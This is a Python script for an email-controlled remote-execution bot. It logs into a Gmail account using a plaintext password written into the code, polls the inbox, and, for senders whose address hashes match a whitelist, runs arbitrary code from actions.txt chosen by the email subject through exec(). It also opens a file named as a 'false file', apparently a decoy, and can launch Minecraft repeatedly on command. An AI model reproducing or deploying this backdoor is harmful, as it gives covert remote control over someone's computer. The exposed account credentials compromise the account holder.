print('LOADING...')
import smtplib
import time
import imaplib
import email
import sys
import os
import time
import hashlib
from random import randint
from subprocess import check_output
from stringco import *
import pyautogui
#from pynput.keyboard import Key, Controller

def hashh(s):
    return hashlib.md5(s.encode()).digest()

print(hashh('PWD'), sep="\n")

try:
    b_code_f = open('board_code.txt', 'r')
    b_code = int(b_code_f.read())
except:
    b_code = randint(0, 10000)
    b_code_f = open('board_code.txt', 'w')
    b_code_f.write(str(b_code))
    b_code_f.close()
print('Current board code', b_code)

keyss = [b"\x97K\x8c\xaf\xe7'1&\x1a\x05f\x91\x949\x0b\xc1",
        b'\xbdm;]\xed\xec;\xc0>\xba\xee]}\x15\x8a!',
        b'\xe6P\xb6b1x\x11\xae?\x87\xc4\x9bO=s\xd6',
        b'pLl\xed\x9b\xe32\x97"\xe3\xc6a\xc3\xe76\xe8',
        b'\xa3\xb7\x03\xf2\xc1p\x03[*\xf2F\xaa&I",',
        b'\xfb\x1eI\xbd=\xdd\x9fw$\xce\x15\xa5\xddj\x1e\x81',
        b'^\x05\xaf\x08\x91\xf93\xc4\x06\xd0\xea@\xaf\xbc\x91?',
        b')\xc0\xc3s\x15\xa4?n*\xe7c\xb4\x1b\xf3\x1e\x80',
        b'\x01u\x1d\xd6\xdd\xd3\xd3F/\xe1fqF\xdc\xf3\x96',
        b'\x18P\x9e%\x8a\x98\x13\x0c^\xc4{LMO4\x93',
        b'\x8d,\x86K*\x1aJ\xedx\xd9\xef\x0e\xd5"\xa4\xe6',
        b'G\xdf-<;\xf4\xfck?\xfe\xe1\xd8f&i~',
        b'\xf6\xf9\xea\x8c\xa5M\xa3"SL\xf8\xba\xe1<\xf9\x10']

exec(open('keys.txt', 'r').read())
keys = keys + keyss
cur_switches = [-1] * len(keys)

class actions:
    coms = []
    execs = []
    def __init__(self, fname):
        file = openS(fname, 'r')
        inp = ''
        is_code = False
        code_part = ''
        while True:
            inp = file.readline()
            if inp == ';':
                break
            elif inp == '>$\n':
                self.execs.append(code_part)
                code_part = ''
                is_code = False
            elif inp == '$<\n':
                is_code = True
            else:
                if is_code:
                    code_part = code_part + inp
                else:
                    self.coms.append(inp[:-1])
        print(self.coms)
        print(self.execs)
    def find(self, st):
        s = st.split()[0]
        i = strco.Dam(self.coms, s)
        return self.execs[i]
    def findO(self, st):
        s = st.split()[0]
        for i in range(len(self.coms)):
            print(self.coms, self.coms[i], s)
            if self.coms[i] == s:
                #print(execs[i])
                return self.execs[i]

def openS(fname, mode):
    try:
        file = open(fname, mode)
    except:
        _=0
        #file = open('../HDBlond/' + fname, mode)
    return file

f_path = openS('path_to_false_file.txt', 'r')
acts = actions('actions.txt')
os.startfile(f_path.read())

ORG_EMAIL   = "@gmail.com"
FROM_EMAIL  = "proect.board.22" + ORG_EMAIL
FROM_PWD    = "q1w2e3r4t5y6u7i8o9p0[-]="
SMTP_SERVER = "imap.gmail.com"
SMTP_PORT   = 993

out = openS('output.txt', 'w')
try:
    file = openS('last_ind.txt', 'r')
except:
    file = openS('last_ind.txt', 'w')
    file.write('0')
    file.close()
    file = openS('last_ind.txt', 'r')
last_ind = int(file.readline())
file.close()

mail = imaplib.IMAP4_SSL(SMTP_SERVER)
mail.login(FROM_EMAIL,FROM_PWD)

def read_email_from_gmail():
    global last_ind, mail
    mail.select('inbox')

    typee, data = mail.search(None, 'ALL')
    mail_ids = data[0]

    id_list = mail_ids.split()
    first_email_id = int(id_list[0])
    latest_email_id = int(id_list[-1])

    if last_ind != len(id_list) - 1:
        for i in id_list[len(id_list) - 1:][::-1]:
            file = openS('last_ind.txt', 'w')
            last_ind = len(id_list) - 1
            file.write(str(last_ind))
            file.close()
            typ, data = mail.fetch(i, '(RFC822)')

            for response_part in data:
                if isinstance(response_part, tuple):
                    if isinstance(response_part[1], bytes):
                        msg = email.message_from_bytes(response_part[1])
                        email_subject = msg['subject']
                        sender = msg['from']
                        print('Got mail from', sender[sender.find('<') + 1:-1])
                        if hashh(sender[sender.find('<') + 1:-1]) in keys:
                            cur_ind = keys.index(hashh(sender[sender.find('<') + 1:-1]))
                            sep = email_subject.split()
                            if sep[0] == 'TURNTO':
                                if sep[1] == 'ALL':
                                    cur_switches[cur_ind] = -1
                                else:
                                    cur_switches[cur_ind] = int(sep[1])
                            if cur_switches[cur_ind] in [b_code, -1]:
                                if email_subject == 'MINECRAFTRUN':
                                    return -1
                                elif email_subject == 'MINECRAFTFLOW':
                                    return -2
                                elif email_subject == 'STOP':
                                    quit()
                                else:
                                    subject = email_subject
                                    #print(subject)
                                    exec(acts.find(email_subject))
                        else:
                            print('NOPEFISH ERROR')
                    else:
                        print('ERR')
    return -100

m_path = openS('path_to_minecraft.txt', 'r')
print('Reading GMAIL', FROM_EMAIL)
print(keys)
print('LOADING...')
while True:
    try:
        res = read_email_from_gmail()
        if res == -1:
            os.startfile(m_path.read())
        if res == -2:
            for i in range(10):
                os.startfile(m_path.read())
    except ZeroDivisionError:
        print('ERROR')
out.close()
